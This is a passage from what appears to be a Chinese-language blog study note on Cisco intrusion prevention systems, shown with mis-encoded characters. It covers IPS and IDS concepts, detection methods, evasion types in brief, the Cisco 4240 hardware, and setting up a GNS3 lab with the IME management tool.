<li>IPS deny actionèƒ½å¤Ÿé˜»æ­¢è§¦å‘åŒ…ï¼Œåç»­æ•°æ®åŒ…ï¼Œæˆ–è€…æ‰€æœ‰æºè‡³äºæ”»å‡»è€…çš„åŒ…</li>
<li>IPSèƒ½å¤Ÿä½¿ç”¨æµé‡è§„èŒƒåŒ–æŠ€æœ¯ï¼Œå‡å°‘æˆ–è€…æ¶ˆé™¤å¾ˆå¤šç½‘ç»œé€ƒé¿æŠ€æœ¯</li>
<li>IPSèƒ½å¤Ÿæœ‰æ•ˆçš„é˜»æ­¢è •è™«</li>
</ul>
</li>
<li>IPSé—®é¢˜<ul>
<li>IPSçš„é”™è¯¯æˆ–è€…æŸåä¼šå½±å“åˆ°ç½‘ç»œçš„æµé‡</li>
<li>ä¸€æ—¦è¶…è¿‡äº†IPSçš„å¤„ç†èƒ½åŠ›ï¼Œä¼šå½±å“åˆ°ç½‘ç»œçš„æ­£å¸¸å·¥ä½œ</li>
<li>IPSä¼šå½±å“åˆ°å¯¹æ—¶é—´æ•æ„Ÿçš„è¿ç”¨ç¨‹åºï¼Œä¾‹å¦‚VOIP</li>
</ul>
</li>
<li>è¡¡é‡IPSçš„æ ‡å‡†<ul>
<li>False positiveï¼ˆé”™æŠ¥ï¼‰</li>
<li>False negativeï¼ˆæ¼æŠ¥ï¼‰</li>
</ul>
</li>
<li>â­ IPSä¸‰ç§æ¥å£ç±»å‹<ul>
<li>Command and Control Interface<ul>
<li>æè¿°ï¼šå¸¦å¤–ç½‘ç®¡å£ï¼ˆæ’ç½‘çº¿ï¼‰</li>
<li>åŠŸèƒ½ï¼šéœ€è¦é…ç½®IPåœ°å€ï¼Œæœ‰è·¯ç”±èƒ½åŠ›ï¼Œç®¡ç†æµé‡ï¼ˆhttps/ssh/telnetï¼‰ä»æ­¤æ¥å£è¿›å…¥</li>
</ul>
</li>
<li>Console and AUX port<ul>
<li>æè¿°ï¼šConsole AUXç®¡ç†æ¥å£ï¼ˆæ’Consoleçº¿ï¼‰</li>
<li>åŠŸèƒ½ï¼šCLIå¸¦å¤–ç®¡ç†ï¼ˆå‘½ä»¤è¡Œï¼‰</li>
</ul>
</li>
<li>Monitoringï¼ˆSensorï¼‰Interfaces<ul>
<li>æè¿°ï¼šç›‘æ§æ¥å£ï¼ˆæ’ç½‘çº¿ï¼‰</li>
<li>åŠŸèƒ½ï¼šä¸èƒ½é…ç½®IPåœ°å€ï¼Œæ²¡æœ‰è·¯ç”±èƒ½åŠ›ï¼Œç›‘æ§æµé‡ä»æ­¤æ¥å£è¿›å…¥<ul>
<li>IPSå·¥ä½œæ¨¡å¼</li>
</ul>
</li>
</ul>
</li>
<li>Promiscuous-Mode Protectionï¼šIDS</li>
<li>Inline-Mode Protectionï¼šIPS</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IPS--IDS%E9%83%A8%E7%BD%B2.png" alt="IPS--IDSéƒ¨ç½²"></p>
<p><img src="/images/ips/ips-notepad/IPS--IPS%E9%83%A8%E7%BD%B2.png" alt="IPS--IPSéƒ¨ç½²"></p>
<ul>
<li><strong>æ³¨æ„</strong>ï¼š<ul>
<li>â–² å¯ä»¥å•ä¸€éƒ¨ç½²IPS</li>
<li>â–² IPSå¯ä»¥ç±»æ¯”äºå¤–éƒ¨çš„AVæŸ¥æ€è½¯ä»¶</li>
</ul>
</li>
</ul>
<h5 id="IPS-IDSæŠ€æœ¯å‘å±•å†ç¨‹"><a href="#IPS-IDSæŠ€æœ¯å‘å±•å†ç¨‹" class="headerlink" title="IPS/IDSæŠ€æœ¯å‘å±•å†ç¨‹"></a>IPS/IDSæŠ€æœ¯å‘å±•å†ç¨‹</h5><ul>
<li>1987å¹´ï¼Œå…¥ä¾µå®‰å…¨æ£€æµ‹ä¸“å®¶ç³»ç»Ÿæ¨¡å‹çš„æå‡º</li>
<li>1988å¹´ï¼ŒMorrisè •è™«çš„çˆ†å‘ï¼Œä¿ƒè¿›äº†IDSå¼€å‘ç ”åˆ¶</li>
<li>1990å¹´ï¼Œç½‘ç»œIDSâ€“NSMï¼ˆç½‘ç»œå®‰å…¨ç›‘è§†ï¼‰ç”¨æ¥æ£€æµ‹æ‰€ç›‘è§†çš„å¹¿åŸŸç½‘çš„ç½‘ç»œæµé‡çš„å¯ç–‘è¡Œä¸º</li>
<li>1998å¹´ï¼Œå¼€æºIDSï¼šSnort</li>
<li>2000å¹´ï¼ŒéIDSå‚å•†æå‡ºIPSæ¦‚å¿µï¼Œå¹¶å‘å¸ƒäº§å“</li>
<li>2003å¹´ï¼Œä¸»æµå¼€å§‹ä½¿ç”¨IPS</li>
</ul>
<h5 id="IPSã€IDSã€é˜²ç«å¢™"><a href="#IPSã€IDSã€é˜²ç«å¢™" class="headerlink" title="IPSã€IDSã€é˜²ç«å¢™"></a>IPSã€IDSã€é˜²ç«å¢™</h5><ul>
<li>åœ¨ç½‘ç»œç¯å¢ƒä¸­ï¼ŒFWã€IPSä¸€å‰ä¸€åéƒ¨ç½²ï¼Œå½¢æˆçºµæ·±çš„ç«‹ä½“é˜²å¾¡</li>
</ul>
<p><img src="/images/ips/ips-notepad/IPS%E4%B8%8E%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E6%AF%94%E8%BE%83.png" alt="IPSä¸é˜²ç«å¢™çš„æ¯”è¾ƒ"></p>
<ul>
<li>ç”±äºIDSä¸ç”Ÿä¿±æ¥çš„ç¼ºé™·ï¼ŒIPSå¿…å°†å…¨é¢å–ä»£IDSã€‚DPtech IPS 2000å¯ä»¥åŒæ—¶å®ç°IPS/IDS</li>
</ul>
<p><img src="/images/ips/ips-notepad/IPS%E4%B8%8EIDS%E7%9A%84%E6%AF%94%E8%BE%83.png" alt="IPSä¸IDSçš„æ¯”è¾ƒ"></p>
<ul>
<li>é˜²ç«å¢™ä¸»è¦æä¾›å®‰å…¨åŒºåŸŸéš”ç¦»ã€è®¿é—®æ§åˆ¶å’ŒVPNåŠŸèƒ½ã€ä¸èƒ½æœ‰æ•ˆæ£€æµ‹å¹¶é˜»æ–­å¤¹æ‚åœ¨æ­£å¸¸æµé‡ä¸­çš„åº”ç”¨å±‚æ”»å‡»ä»£ç <ul>
<li>DMZåŒºåŸŸå¯¹å¤–æä¾›æœåŠ¡</li>
</ul>
</li>
<li>IDSç”±äºæ—è·¯éƒ¨ç½²ï¼Œä¾§é‡å®‰å…¨çŠ¶æ€ç›‘æ§ï¼Œéœ€è¦å’Œé˜²ç«å¢™è”åŠ¨æ‰èƒ½æŠµå¾¡å¨èƒï¼Œé€‚ç”¨äºâ€œäº‹åå®¡è®¡â€ï¼Œæ— æ³•æ»¡è¶³å®æ—¶å®‰å…¨é˜²æŠ¤</li>
<li>IPSåœ¨çº¿éƒ¨ç½²ã€ä¸»åŠ¨é˜²å¾¡ã€å®æ—¶é˜»æ–­æ”»å‡»</li>
</ul>
<p><img src="/images/ips/ips-notepad/IPS%E3%80%81IDS%E3%80%81%E9%98%B2%E7%81%AB%E5%A2%99.png" alt="IPSã€IDSã€é˜²ç«å¢™"></p>
<h5 id="â­-æŠ€æœ¯ä»‹ç»"><a href="#â­-æŠ€æœ¯ä»‹ç»" class="headerlink" title="â­ æŠ€æœ¯ä»‹ç»"></a>â­ æŠ€æœ¯ä»‹ç»</h5><ul>
<li>Profile-Based Intrustion Detection<ul>
<li>ç‰¹ç‚¹ï¼šå®šä¹‰æ­£å¸¸æµé‡ï¼Œå…¶ä½™å‡ä¸ºéæ³•æµé‡</li>
<li>ä¼˜ç‚¹ï¼šé»‘å®¢å¾ˆéš¾åˆ¤æ–­ä»€ä¹ˆæ˜¯åˆæ³•æµé‡ï¼Œèƒ½å¤Ÿå‘ç°æœ€æ–°çš„è¿˜æ²¡è¢«å…¬å¸ƒçš„æ”»å‡»</li>
<li>ç¼ºç‚¹ï¼šå¾ˆéš¾è§„å®šæ­£å¸¸æµé‡ï¼Œå‘Šè­¦å¾ˆéš¾ç†è§£ï¼Œé”™è¯¯è¯¯æŠ¥å¾ˆå¤š</li>
<li>äº§å“ï¼šä¸»æœºIPSï¼ˆCSAï¼‰</li>
</ul>
</li>
<li>Signature-Based Intrusion Detection<ul>
<li>ç‰¹ç‚¹ï¼šé€šè¿‡Signaureï¼ˆç‰¹æ€§ä»£ç ï¼‰åŒ¹é…æ”»å‡»</li>
<li>ä¼˜ç‚¹ï¼šæ¶æ„å¾ˆå®¹æ˜“ï¼Œå‘Šè­¦å¾ˆå®¹æ˜“ç†è§£ï¼Œèƒ½å¤Ÿè‡ªå®šä¹‰Sig</li>
<li>ç¼ºç‚¹ï¼šä¸èƒ½æ£€æµ‹æœªè¢«å…¬å¸ƒçš„æ”»å‡»ï¼Œéœ€è¦ç»å¸¸å‡çº§ï¼Œéœ€è¦Cacheæµé‡</li>
<li>äº§å“ï¼šç½‘ç»œIPSï¼ˆ4215ï¼Œ4240â€¦.ï¼‰</li>
</ul>
</li>
<li>Protocol Analysis<ul>
<li>ç‰¹ç‚¹ï¼šåŸºäºRFCæˆ–è€…å®‰å…¨è§„èŒƒç›‘æ§åè®®</li>
<li>äº§å“ï¼šé˜²ç«å¢™çš„è¿ç”¨å±‚ç›‘æ§</li>
</ul>
</li>
</ul>
<h5 id="â­-èº²é¿æ‰‹æ®µ"><a href="#â­-èº²é¿æ‰‹æ®µ" class="headerlink" title="â­ èº²é¿æ‰‹æ®µ"></a>â­ èº²é¿æ‰‹æ®µ</h5><ul>
<li>Floodingï¼ˆæ³›æ´ªæ”»å‡»ï¼‰<ul>
<li>é€ƒé¿æ‰‹æ®µï¼šåˆ¶é€ å¤§é‡è¶…å‡ºIPSå¤„ç†èƒ½åŠ›çš„æµé‡ï¼Œæ©æŠ¤éæ³•æµé‡ç©¿è¶ŠIPS</li>
</ul>
</li>
<li>Frametationï¼ˆåˆ†ç‰‡ï¼‰<ul>
<li>é€ƒé¿æ‰‹æ®µï¼šåˆ¶é€ å¤§é‡åˆ†ç‰‡è€—å°½IPSç¼“å­˜ï¼Œå®æ–½å¯¹IPSçš„DoSï¼Œæ©æŠ¤éæ³•åˆ†ç‰‡æµé‡</li>
</ul>
</li>
<li>Encryptionï¼ˆåŠ å¯†ï¼‰<ul>
<li>é€ƒé¿æ‰‹æ®µï¼šåŠ å¯†æ”»å‡»æµé‡</li>
<li>ä¾‹å¦‚ï¼šé€šè¿‡æœ¨é©¬æ§åˆ¶å®¢æˆ·ç«¯å‘èµ·åŠ å¯†æµé‡åˆ°æ”»å‡»è€…</li>
</ul>
</li>
<li>Obfuscationï¼ˆå›°æƒ‘ï¼‰<ul>
<li>é€ƒé¿æ‰‹æ®µï¼šæ”»å‡»è€…é€šè¿‡ä¸åŒçš„ç¼–ç æ–¹å¼æ¥é€ƒé¿IPSæ£€æµ‹</li>
<li>ä¾‹å¦‚ï¼š@æ³•#è½®ï¿¥åŠŸ%</li>
</ul>
</li>
</ul>
<h5 id="Cisco-4240"><a href="#Cisco-4240" class="headerlink" title="Cisco 4240"></a>Cisco 4240</h5><ul>
<li>Cisco 4240æ­£é¢æ¿<ul>
<li>Ciscoçš„IPSä¸é˜²ç«å¢™å¤–è§‚ç›¸åŒï¼Œä»…ç®€ä»‹ä¸åŒ</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/Cisco%E6%AD%A3%E9%9D%A2%E6%9D%BF.png" alt="Ciscoæ­£é¢æ¿"></p>
<ul>
<li>Cisco 4240èƒŒé¢æ¿<ul>
<li>Command and Control Interface<ul>
<li>æè¿°ï¼šå¸¦å¤–ç½‘ç®¡å£ï¼ˆæ’ç½‘çº¿ï¼‰</li>
<li>åŠŸèƒ½ï¼šéœ€è¦é…ç½®IPåœ°å€ï¼Œæœ‰è·¯ç”±èƒ½åŠ›ï¼Œç®¡ç†æµé‡ï¼ˆhttps/ssh/telnetï¼‰ä»æ­¤æ¥å£è¿›å…¥</li>
</ul>
</li>
<li>Console and AUX port<ul>
<li>æè¿°ï¼šConsole AUXç®¡ç†æ¥å£ï¼ˆæ’Consoleçº¿ï¼‰</li>
<li>åŠŸèƒ½ï¼šCLIå¸¦å¤–ç®¡ç†ï¼ˆå‘½ä»¤è¡Œï¼‰</li>
</ul>
</li>
<li>Monitoringï¼ˆSensorï¼‰Interfaces<ul>
<li>æè¿°ï¼šç›‘æ§æ¥å£ï¼ˆæ’ç½‘çº¿ï¼‰</li>
<li>åŠŸèƒ½ï¼šä¸èƒ½é…ç½®IPåœ°å€ï¼Œæ²¡æœ‰è·¯ç”±èƒ½åŠ›ï¼Œç›‘æ§æµé‡ä»æ­¤æ¥å£è¿›å…¥</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/Cisco%E8%83%8C%E9%9D%A2%E6%9D%BF.png" alt="CiscoèƒŒé¢æ¿"></p>
<h5 id="å®éªŒ"><a href="#å®éªŒ" class="headerlink" title="å®éªŒ"></a>å®éªŒ</h5><ul>
<li>GNS3 0.8.6ï¼ˆå‚»ç“œå¼å®‰è£…ï¼‰<ul>
<li>éœ€è¦å®‰è£…Winpcap 4.1.3</li>
<li>éœ€è¦å®‰è£…Wireshark 1.10.2ï¼ˆ32bitï¼‰</li>
<li>å¯¼å…¥ISO<ul>
<li>Edit â†’ IOS and Hypervisors â†’ Image file â†’ binæ–‡ä»¶ â†’ save</li>
<li>å¯¼å…¥è·¯å¾„ä¸èƒ½æœ‰ä¸­æ–‡å­—ç¬¦</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/GNS3%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F.png" alt="GNS3é…ç½®æˆåŠŸ"></p>
<p><img src="/images/ips/ips-notepad/GNS%E5%AF%BC%E5%85%A5%E9%95%9C%E5%83%8F%E6%88%90%E5%8A%9F.png" alt="GNSå¯¼å…¥é•œåƒæˆåŠŸ"></p>
<ul>
<li>SecureCRT_6.5.3.490ï¼ˆå‚»ç“œå¼å®‰è£…ï¼‰<ul>
<li>å¯ä»¥è‡ªå®šä¹‰å®‰è£…ï¼Œä¸å Cç›˜èµ„æºç©ºé—´</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/SecureCRT%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F.png" alt="SecureCRTé…ç½®æˆåŠŸ"> </p>
<ul>
<li>IPS-4240<ul>
<li>å¯¼å…¥ovaæ–‡ä»¶ï¼Œè®¾ç½®æ–°è™šæ‹Ÿæœºä½ç½®<ul>
<li>è´¦å·ï¼šcisco</li>
<li>å¯†ç ï¼šciscoips123</li>
</ul>
</li>
<li>ç½‘ç»œé€‚é…å™¨ï¼šè‡ªå®šä¹‰ï¼ˆVMnet8(NATæ¨¡å¼)ï¼‰</li>
<li>ç½‘ç»œé€‚é…å™¨2ï¼šè‡ªå®šä¹‰VMnet2</li>
<li>ç½‘ç»œé€‚é…å™¨3ï¼šè‡ªå®šä¹‰VMnet3</li>
<li>ç½‘ç»œé€‚é…å™¨4ï¼šæ¡¥æ¥æ¨¡å¼ï¼ˆè‡ªåŠ¨ï¼‰</li>
<li>ç½‘ç»œé€‚é…å™¨5ï¼šæ¡¥æ¥æ¨¡å¼ï¼ˆè‡ªåŠ¨ï¼‰</li>
<li>æ–°å¢ä¸²è¡Œç«¯å£ï¼šä½¿ç”¨å‘½åçš„ç®¡é“:\.\pipe\842-1</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IPS%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F.png" alt="IPSé…ç½®æˆåŠŸ"></p>
<ul>
<li>Piped.exeï¼ˆç”¨MFCå¼€å‘ï¼‰<ul>
<li>æ¨¡æ‹ŸIPSä¸²è¡Œç«¯å£</li>
<li>è¾“å…¥Pipeå’Œè‡ªå®šä¹‰Port</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/Piped%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F.png" alt="Pipedé…ç½®æˆåŠŸ"></p>
<ul>
<li>SecureCRTè¿æ¥<ul>
<li>æ–°å»ºå¿«é€Ÿè¿æ¥<ul>
<li>åè®®ï¼šTelnet</li>
<li>ä¸»æœºåï¼š127.0.0.1</li>
<li>ç«¯å£ï¼šåœ¨Pipedè‡ªå®šä¹‰çš„Port</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/SecureCRT%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F.png" alt="SecureCRTè¿æ¥æˆåŠŸ"></p>
<h3 id="0X01-IPSç¯å¢ƒæ­å»º"><a href="#0X01-IPSç¯å¢ƒæ­å»º" class="headerlink" title="0X01 IPSç¯å¢ƒæ­å»º"></a>0X01 IPSç¯å¢ƒæ­å»º</h3><h5 id="é€‰æ‹©GNS"><a href="#é€‰æ‹©GNS" class="headerlink" title="é€‰æ‹©GNS"></a>é€‰æ‹©GNS</h5><ul>
<li>GNSå¯ä»¥å¯¼å…¥å¤–éƒ¨æ¨¡å—ï¼Œä½†PTä¸è¡Œ</li>
</ul>
<h5 id="åˆå§‹åŒ–IPS"><a href="#åˆå§‹åŒ–IPS" class="headerlink" title="åˆå§‹åŒ–IPS"></a>åˆå§‹åŒ–IPS</h5><ul>
<li>setup<ul>
<li>Enter host name:IPS</li>
<li>Enter IP Interface:è®¾ç½®VM8çš„IPåœ°å€ä»¥åŠç½‘å…³</li>
<li>â–² å…¶ä»–é»˜è®¤</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IPS-4240%E5%88%9D%E5%A7%8B%E5%8C%96%E9%85%8D%E7%BD%AE.png" alt="IPS-4240åˆå§‹åŒ–é…ç½®"></p>
<p><img src="/images/ips/ips-notepad/IPS-4240%E5%88%9D%E5%A7%8B%E5%8C%96%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F.png" alt="IPS-4240åˆå§‹åŒ–é…ç½®æˆåŠŸ"></p>
<h5 id="IME"><a href="#IME" class="headerlink" title="IME"></a>IME</h5><ul>
<li>å®‰è£…IMEå¯¹å¯†ç æœ‰è¦æ±‚ï¼Œå¼±å£ä»¤æ— æ³•ç™»é™†</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME%E8%AE%BE%E7%BD%AE%E7%AE%80%E5%8D%95%E5%AF%86%E7%A0%81%E6%8A%A5%E9%94%99.png" alt="IMEè®¾ç½®ç®€å•å¯†ç æŠ¥é”™"></p>
<ul>
<li>é…ç½®IME<ul>
<li>æ·»åŠ IPSçš„IPåœ°å€ä»¥åŠç«¯å£</li>
<li>æ·»åŠ IPSçš„è´¦å·å¯†ç </li>
<li>â–² é…ç½®çš„æ—¶å€™ï¼Œéœ€è¦è®¾ç½®Configuration Userå’ŒEvent Subscription User</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME%E6%B7%BB%E5%8A%A0%E8%AE%BE%E5%A4%87.png" alt="IMEæ·»åŠ è®¾å¤‡"></p>
<p><img src="/images/ips/ips-notepad/IME%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F.png" alt="IMEé…ç½®æˆåŠŸ"></p>
<p><img src="/images/ips/ips-notepad/IPS-Configuration.png" alt="IPS-Configuration"></p>
<h3 id="0X02-IMEâ€“IPSä½¿ç”¨"><a href="#0X02-IMEâ€“IPSä½¿ç”¨" class="headerlink" title="0X02 IMEâ€“IPSä½¿ç”¨"></a>0X02 IMEâ€“IPSä½¿ç”¨</h3><h5 id="å¸¸ç”¨çš„ç½‘ç»œå®‰å…¨è®¾å¤‡"><a href="#å¸¸ç”¨çš„ç½‘ç»œå®‰å…¨è®¾å¤‡" class="headerlink" title="å¸¸ç”¨çš„ç½‘ç»œå®‰å…¨è®¾å¤‡"></a>å¸¸ç”¨çš„ç½‘ç»œå®‰å…¨è®¾å¤‡</h5><ul>
<li>é˜²ç«å¢™</li>
<li>VPNï¼ˆè™šæ‹Ÿä¸“ç”¨ç½‘ç»œï¼‰</li>
<li>IDSå’ŒIPS</li>
<li>æ€æ¯’è½¯ä»¶</li>
<li>UTMï¼ˆå¨èƒç®¡ç†ï¼‰</li>
</ul>
<h5 id="IPS-gt-Sensor-Setup"><a href="#IPS-gt-Sensor-Setup" class="headerlink" title="IPS -&gt; Sensor Setup"></a>IPS -&gt; Sensor Setup</h5><ul>
<li>Network<ul>
<li>Allow Password Recoveryï¼šè¿™ä¸ªé€‰é¡¹é»˜è®¤æ˜¯å¼€å¯çš„ã€‚ç”¨äºå¦‚æœå¿˜è®°IPSçš„ç™»é™†å¯†ç ã€‚å¯ä»¥åœ¨IPSå¯æœºè¿‡ç¨‹å½“ä¸­ä½¿ç”¨å¯†ç æ¢å¤åŠŸèƒ½ã€‚æŠŠIPSçš„å¯†ç æ¢å¤æˆé»˜è®¤çš„cisco.æ³¨æ„ã€‚è¿™ä¸ªæ¢å¤ã€‚ä¸ä¼šå½±å“åˆ°IPSçš„ä¸€äº›ç›¸å…³é…ç½®ã€‚IPSé»˜è®¤æ˜¯ä¸å¼€å¯telnetåŠŸèƒ½çš„ã€‚å¯ä»¥é€šè¿‡è¿™ä¸ªé¢æ¿å¼€å¯ã€‚</li>
<li>LOGIN Bannerï¼šç”¨äºåœ¨ç™»é™†IPSçš„æ—¶å€™ï¼Œå¼¹å‡ºç›¸å…³å‘Šè­¦ã€‚</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS--Network.png" alt="IME--IPS--Network"></p>
<p><img src="/images/ips/ips-notepad/IME--IPS--Login-Banner.png" alt="IME--IPS--Login-Banner"></p>
<ul>
<li>Allowed Host/Networksï¼šç”¨äºé™åˆ¶å“ªä¸ªå°è®¾å¤‡ï¼Œæˆ–è€…å“ªä¸ªç½‘æ®µã€‚å¯ä»¥ç½‘ç®¡è¿™å°IPSã€‚</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS--Permit.png" alt="IME--IPS--Permit"></p>
<ul>
<li>Time</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS--Time.png" alt="IME--IPS--Time"></p>
<ul>
<li>Authenticationï¼šç”¨äºç®¡ç†IPSç”¨æˆ·å¸å·å¯†ç ï¼Œå¹¶ä¸ºæŸä¸ªå¸å·æˆæƒç›¸åº”æƒé™</li>
<li>æƒé™ç­‰çº§<ul>
<li>Administratorï¼šç®¡ç†å‘˜æƒé™ã€‚å¯¹äºIPSç®¡ç†å’Œé…ç½®æ¥è¯´ã€‚æ˜¯æœ€é«˜æƒé™ã€‚å¯ä»¥å¯¹IPSçš„åŸºæœ¬ç½‘ç»œï¼Œç½‘ç»œç®¡ç†ï¼Œæ¥å£ç®¡ç†ï¼Œç­–ç•¥ç®¡ç†ï¼Œæ—¥å¿—è¯»å–è¿›è¡Œé…ç½®</li>
<li>Operatorï¼šæ“ä½œè€…æƒé™ã€‚å¯ä»¥å¯¹äºIPSçš„ç­–ç•¥ï¼Œæ—¥å¿—è¯»å–è¿›è¡Œé…ç½®</li>
<li>Viewerï¼šæŸ¥çœ‹è€…æƒé™ã€‚ç´§ç´§åªèƒ½å¯¹IPSçš„æ—¥å¿—è¿›è¡Œè¯»å–</li>
<li>Serviceï¼šIPSåº•å±‚æƒé™ã€‚IPSåº•å±‚ä¿®æ”¹æ—¶ä½¿ç”¨ï¼ˆé€šè¿‡Consoleå£è¿æ¥ï¼‰</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS--Authentication.png" alt="IME--IPS--Authentication"></p>
<h5 id="IPSå‡ºå…¥æµé‡ç­–ç•¥"><a href="#IPSå‡ºå…¥æµé‡ç­–ç•¥" class="headerlink" title="IPSå‡ºå…¥æµé‡ç­–ç•¥"></a>IPSå‡ºå…¥æµé‡ç­–ç•¥</h5><ul>
<li><p>Outboundæµé‡</p>
<ul>
<li>IPSå¯¹äºè¿™ç§æµé‡ä¸åšä»»ä½•é™åˆ¶ã€‚ä¹Ÿå°±æ˜¯è¯´ã€‚åªè¦æ˜¯è·¯ç”±å­˜åœ¨çš„æƒ…å†µä¸‹ã€‚å¹¶ä¸”åœ¨IPSå»å¾€æŸä¸ªç›®çš„IPçš„è¿‡ç¨‹ä¸­ï¼Œæ²¡æœ‰ç­–ç•¥æ‹’ç»è¿™è‚¡æµé‡çš„è¯ã€‚IPSå¯ä»¥æŠµè¾¾ç½‘ç»œä¸­ä»»ä½•ä¸€ä¸ªIPä¸»æœºã€‚</li>
<li>â–² IPSè¿›è¡Œè¿™ç§é€šä¿¡çš„æ—¶å€™ã€‚ä½¿ç”¨çš„æ˜¯ç®¡ç†æ¥å£ï¼ˆMå£ï¼‰</li>
</ul>
</li>
<li><p>Inboundæµé‡å…è®¸</p>
<ul>
<li>å·²å»ºç«‹è¿æ¥çš„æµé‡ï¼ˆå¯¹IPSçš„ä¸€ä¸ªå›ç¨‹æŠ¥æ–‡ï¼Œå§‹å‘è€…æ˜¯IPSï¼‰</li>
<li>æºè‡ªäºNTPæœåŠ¡å™¨çš„æ•°æ®åŒ…</li>
<li>Allowed Hostæ‰€æ”¾è¡Œçš„æµé‡ã€‚Allowed Hostç±»ä¼¼äºACLåº”ç”¨åœ¨VTYé“¾è·¯ã€‚æ·»åŠ æ¡ç›®çš„æ—¶å€™ï¼Œå¯ä»¥é’ˆå¯¹ä¸€ä¸ªä¸»æœºæˆ–è€…ä¸€ä¸ªå­ç½‘</li>
</ul>
</li>
</ul>
<h5 id="IPS-gt-Interface"><a href="#IPS-gt-Interface" class="headerlink" title="IPS -&gt; Interface"></a>IPS -&gt; Interface</h5><ul>
<li>Bypass<ul>
<li>ç”¨äºä¿®æ”¹</li>
<li>ä¸‰ç§æ¨¡å¼<ul>
<li>AUTOï¼šè‡ªåŠ¨æ¨¡å¼ã€‚å½“IPSæ£€æµ‹å¼•æ“å‘ç”Ÿæ•…éšœçš„æ—¶å€™ï¼Œå¯¹äºæµé‡çš„ç›‘æ§ï¼Œè‡ªåŠ¨å…³é—­ã€‚ç›´æ¥æ”¾è¡Œæµé‡ï¼ˆé»˜è®¤å½¢å¼ï¼‰</li>
<li>ONï¼šå¼€å¯æ—è·¯æ¨¡å¼ã€‚IPSå¯¹æµé‡çš„ç›‘æ§ç›´æ¥å…³é—­ã€‚å¯¹ä»»ä½•æ¥åˆ°IPSçš„æµé‡éƒ½ä¸åšæ£€æµ‹åŒ¹é…ï¼Œç›´æ¥æ”¾è¡Œ</li>
<li>OFFï¼šå…³é—­æ—è·¯æ¨¡å¼ã€‚IPSå¯¹äºæµé‡çš„ç›‘æ§æ˜¯å¿…é¡»çš„ã€‚å¦‚æœå‘ç”Ÿæ£€æµ‹å¼•æ“å‘é€æ•…éšœï¼Œè€ŒIPSåˆä½¿ç”¨äº†è¿™ä¸ªæ¨¡å¼ï¼Œé‚£ä¹ˆå°±ä¼šå¯¹ç½‘ç»œé€ æˆä¸€å®šçš„å½±å“</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS--Bypass.png" alt="IME--IPS--Bypass"></p>
<h5 id="IPS-gt-Policies"><a href="#IPS-gt-Policies" class="headerlink" title="IPS -&gt; Policies"></a>IPS -&gt; Policies</h5><ul>
<li>Signaturesï¼šç­¾åã€‚æ”»å‡»ç‰¹å¾ç ã€‚IPSåŒ¹é…æ”»å‡»æµé‡çš„å…³é”®é…ç½®ã€‚å¯¹äºç½‘ç»œä¸­ï¼Œå½¢å½¢è‰²è‰²å„ç§æµé‡ã€‚éƒ½æ˜¯é€šè¿‡Sigå»é…ç½®åŒ¹é…æŒ‡å®šçš„ä¸€äº›ç‰¹æ®Šæµé‡</li>
<li>å¯ä»¥é’ˆå¯¹æŸä¸€æ¡sigè¿›è¡Œé…ç½®ï¼š<br>åŠ¨ä½œï¼ŒåŒ¹é…å‚æ•°ï¼ŒenableçŠ¶æ€ï¼Œé€€ä¼‘çŠ¶æ€ã€‚é’ˆå¯¹æŸæ¡sig.è¿›è¡Œå…‹éš†ï¼Œç¼–è¾‘ã€‚åˆ é™¤ã€‚å¯¼å‡ºã€‚ç­‰ç­‰ä¸€ç³»åˆ—é…ç½®</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS--Sig%E7%89%B9%E5%BE%81%E7%A0%81.png" alt="IME--IPS--Sigç‰¹å¾ç "></p>
<ul>
<li>VSï¼šè™šæ‹Ÿä¼ æ„Ÿå™¨ã€‚å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªè™šæ‹Ÿçš„IPSã€‚ä¸€ä¸ªVSå†…ï¼Œç‹¬ç«‹å…³è”ä¸€ä¸ªæ¥å£ã€‚ç‹¬ç«‹çš„Sigæ”»å‡»åº“ï¼Œç‹¬ç«‹çš„è§„åˆ™ï¼Œç‹¬ç«‹ç­–ç•¥ã€‚å¤šä¸ªVSä¹‹é—´ï¼Œå…³è”ä¸åŒçš„æ¥å£ã€‚ä½¿ç”¨ä¸åŒçš„ç­–ç•¥ã€‚é’ˆå¯¹ä¸åŒæµé‡ï¼Œå®ç°ä¸åŒçš„åŠ¨ä½œã€‚VSä¹‹é—´ç›¸äº’ä¸å½±å“ï¼ˆä»IPSè½¯ä»¶ç‰ˆæœ¬6.Xå¼€å§‹ï¼‰<ul>
<li>æè¿°</li>
<li>å…³è”ç›¸å…³çš„æ¥å£</li>
<li>å…³è”ç›¸å…³çš„SIGæ”»å‡»åº“</li>
<li>å…³è”ç›¸å…³çš„è§„åˆ™</li>
